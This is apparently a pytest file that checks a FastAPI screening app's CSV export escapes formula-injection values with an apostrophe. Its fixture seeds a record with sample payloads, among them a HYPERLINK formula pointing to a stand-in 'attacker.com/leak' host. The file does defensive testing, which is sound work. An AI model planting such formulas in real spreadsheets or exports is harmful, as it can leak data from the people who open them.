"""Tests for CSV formula injection sanitization (F-04).

Verifies that all CSV export cells starting with '=', '+', '-', '@', '\t', '\r'
are prefixed with an apostrophe (e.g. '=HYPERLINK("http://x","y")').
"""

from __future__ import annotations

import os
import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import app.main as main
from app.main import Base, SignerIdentity, ScreeningReport, app, make_session_token, now_utc

SUPER_EMAIL = "supervisor@ssb.gov.in"


@pytest.fixture
def super_client(monkeypatch):
    monkeypatch.setenv("TESTING", "1")
    monkeypatch.setenv("SUPER_ADMINS", SUPER_EMAIL)

    test_engine = create_engine(
        "sqlite:///:memory:", connect_args={"check_same_thread": False}, poolclass=StaticPool
    )
    Base.metadata.create_all(bind=test_engine)
    TestSession = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)
    monkeypatch.setattr(main, "SessionLocal", TestSession)

    db = TestSession()
    try:
        db.add(SignerIdentity(
            email=SUPER_EMAIL, name="Super Officer", institution="SSB",
            designation="Supervisory Inspector", registered_at=now_utc(),
        ))
        # Add a report with formula injection payloads in various document-derived fields
        db.add(ScreeningReport(
            id="=HYPERLINK(\"http://attacker.com/leak\",\"ClickMe\")",
            file_hash="11" * 32,
            filename="invoice.pdf",
            doc_type="+123456",
            checkpoint="-Panitanki",
            verdict="REVIEW",
            risk_score=75,
            confidence=0.85,
            signals="[]",
            screener="@supervisor",
            adjudication="\tAPPROVED_BY_EXCEL",
            adjudicator="\rSUPER_ADMIN",
            created_at="2026-10-12 12:00:00 UTC",
            extracted_fields='{"name": "=HYPERLINK(\\"http://x\\",\\"y\\")"}',
        ))
        db.commit()
    finally:
        db.close()

    client = TestClient(app)
    token = make_session_token(SUPER_EMAIL)
    client.cookies.set("nischay_session", token)
    return client


def test_csv_export_neutralizes_formula_injection(super_client):
    """Every CSV cell starting with =, +, -, @, tab, CR must be prefixed with an apostrophe."""
    res = super_client.get("/api/screen/shift-export")
    assert res.status_code == 200
    assert "text/csv" in res.headers.get("content-type", "")

    csv_text = res.text
    # Parse with standard csv.reader to check actual cell values
    import csv
    import io
    reader = list(csv.reader(io.StringIO(csv_text)))
    data_rows = [row for row in reader if row and not row[0].startswith("#")]
    assert len(data_rows) >= 2  # header + data row
    
    header = data_rows[0]
    data_row = data_rows[1]
    row_dict = dict(zip(header, data_row))

    # Assert raw dangerous formulas are NOT present unescaped at cell boundaries
    assert '=HYPERLINK("http://attacker.com/leak","ClickMe")' not in csv_text
    assert '\n=HYPERLINK' not in csv_text
    assert ',=HYPERLINK' not in csv_text

    # Verify each injected cell has the protective single quote prefix
    assert row_dict["id"].startswith("'=HYPERLINK")
    assert row_dict["doc_type"] == "'+123456"
    assert row_dict["checkpoint"] == "'-Panitanki"
    assert row_dict["screener"] == "'@supervisor"
    assert row_dict["adjudication"] == "'\tAPPROVED_BY_EXCEL"
    assert row_dict["adjudicator"] == "'\rSUPER_ADMIN"

